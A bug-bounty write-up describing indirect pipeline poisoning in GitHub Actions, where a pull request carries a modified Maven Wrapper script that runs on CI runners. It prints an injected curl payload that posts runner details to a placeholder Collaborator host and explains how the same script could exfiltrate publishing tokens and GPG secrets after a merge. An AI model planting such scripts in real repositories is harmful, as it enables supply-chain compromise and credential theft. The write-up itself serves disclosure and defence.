---
title: The Trojan PR: Achieving Code Execution in GitHub Actions via Pipeline Poisoning
url: https://infosecwriteups.com/the-trojan-pr-achieving-code-execution-in-github-actions-via-pipeline-poisoning-a3494bde3f70?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-05-18
fetch_date: 2026-05-19T06:03:31.626819
---

# The Trojan PR: Achieving Code Execution in GitHub Actions via Pipeline Poisoning

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthe-trojan-pr-achieving-code-execution-in-github-actions-via-pipeline-poisoning-a3494bde3f70&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthe-trojan-pr-achieving-code-execution-in-github-actions-via-pipeline-poisoning-a3494bde3f70&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-a3494bde3f70---------------------------------------)

·

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-a3494bde3f70---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

# The Trojan PR: Achieving Code Execution in GitHub Actions via Pipeline Poisoning

[![Hacker MD](https://miro.medium.com/v2/resize:fill:64:64/1*mArHieH3GY7HX9TX7ZAoIg.jpeg)](https://medium.com/%40HackerMD?source=post_page---byline--a3494bde3f70---------------------------------------)

[Hacker MD](https://medium.com/%40HackerMD?source=post_page---byline--a3494bde3f70---------------------------------------)

4 min read

·

3 days ago

--

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Da3494bde3f70&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fthe-trojan-pr-achieving-code-execution-in-github-actions-via-pipeline-poisoning-a3494bde3f70&source=---header_actions--a3494bde3f70---------------------post_audio_button------------------)

Share

Press enter or click to view image in full size

![]()

## Introduction

In the modern era of DevSecOps, CI/CD pipelines are the crown jewels of any organization. They hold production secrets, signing keys, and deployment credentials. But what happens when the pipeline implicitly trusts unverified scripts?

Recently, while participating in a bug bounty program for a large organization, I discovered an **Indirect Pipeline Poisoning (PPE)** vulnerability. By exploiting a simple misconfiguration in their Maven Wrapper setup, I was able to execute arbitrary code on their GitHub-hosted runner.

In this article, I will walk you through the vulnerability, the attack vector, the potential impact on production secrets, and a controversial lesson about “Trust Boundaries” in bug bounty.

## The Target & The Root Cause

While auditing the target’s open-source repository, I focused on their `.github/workflows` directory. I noticed they heavily relied on the Maven Wrapper (`mvnw`) to build and test their Java project across various workflows.

To understand how the wrapper was configured, I inspected the `.mvn/wrapper/maven-wrapper.properties` file. Here is what a secure configuration *should* look like:

```
distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven-3.8.4/apache-maven-3.8.4-bin.zip
wrapperUrl=https://repo.maven.apache.org/maven2/org/apache/maven/wrapper/maven-wrapper/3.1.0/maven-wrapper-3.1.0.jar
distributionSha256Sum=a9b2d825eacf2e771ed5d6b0e01398589ac1bfa4171f36154d1b578787960550
```

However, the target’s repository was missing the critical `distributionSha256Sum` property.

Why is this important? Without the SHA-256 checksum lock, the build environment has **zero integrity verification** for the `mvnw` script and its downloaded archives. It will blindly execute whatever wrapper script is provided in the repository.

## The Attack Vector: Crafting the Trojan

Knowing that the system lacked integrity checks, I created a fork of the repository to build my Proof of Concept (PoC).

Press enter or click to view image in full size

![]()

Press enter or click to view image in full size

![]()

My goal was to demonstrate Remote Code Execution (RCE) on the CI/CD runner. I modified the `./mvnw` script, injecting a malicious payload that would exfiltrate environment variables to my Burp Collaborator server:

```
#!/bin/sh
# Malicious payload injected into mvnw
curl -X POST -d "user=$(whoami)&is_github=$(echo $GITHUB_ACTIONS)" https://[YOUR_BURP_COLLABORATOR_URL]

# ... original mvnw code follows ...
```

I committed this poisoned `mvnw` script to my fork and opened a Pull Request (PR) against the target's main repository.

## Get Hacker MD’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

[x]

Remember me for faster sign in

As soon as the automated PR checks triggered, the GitHub Actions runner picked up my modified `mvnw` script and executed it. *Boom!* I received a ping on my Collaborator server:

```
user=runner
is_github=true
```

*(The source IP confirmed the execution occurred inside the Microsoft Azure / GitHub Actions infrastructure).*

## The Impact: Stealing the Crown Jewels

Execution in a PR context is typically sandboxed, but the real threat of a Supply Chain Attack lies in the **post-merge** phase.

If a maintainer reviewed the PR, focused only on the Java code changes, and missed the slightly modified `mvnw` script, they would merge the "Trojan PR" into the main branch.

Once merged, the poisoned script would become part of the official codebase. The target had a `release.yml` workflow that executed upon publishing a new release:

```
- name: Publish to the Maven Central Repository
        run: ./mvnw deploy
        env:
          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}
          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}
          MAVEN_GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
```

During a release cycle, the environment is highly privileged. My poisoned `mvnw` script would have direct access to exfiltrate the **GPG Private Keys** and **Maven Publishing Tokens**, leading to a complete compromise of their production releases.

## The Plot Twist: “Manual Review as a Trust Boundary”

I submitted this detailed report to the bug bounty program, expecting a swift triage for a Critical/High severity issue. However, the response I received was a classic bug bounty debate.

The security team acknowledged the risk but closed the report as “Informative.” Their reasoning?

> “We have branch protections. The impact depends on attacker-controlled changes being merged into our main repository. That manual review is our trust boundary.”

They relied entirely on the assumption that a human reviewer would spot the malicious bash code in the `mvnw` script before merging.

## The Takeaway: A Failure of Defense-in-Depth

While the program’s reliance on manual review is a common practice in open-source projects, it represents a single point of failure (Human Error).

In modern DevSecOps, **Technical Controls should always back up Procedural Controls**. Adding a simple `distribution...